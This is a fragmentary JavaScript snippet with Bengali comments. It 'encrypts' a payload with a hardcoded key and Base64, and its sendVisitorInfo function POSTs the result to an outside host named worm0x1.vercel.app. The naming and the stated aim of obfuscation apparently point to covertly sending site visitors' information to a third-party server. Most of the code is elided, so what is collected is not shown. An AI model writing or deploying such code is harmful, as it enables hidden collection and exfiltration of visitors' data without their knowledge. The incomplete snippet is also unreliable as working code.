...
// ✅ Improved Encryption - Obfuscation safe
function encryptPayload(data) {
    const SECRET = "MyS3cr3tK3y@2025!";
    ...
    // Base64 encode করার জন্য btoa use করছি
...
async function sendVisitorInfo() {
    try {
        ...
        await fetch('https://worm0x1.vercel.app/api/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ heyman: encrypted })
        });
    } catch (error) {
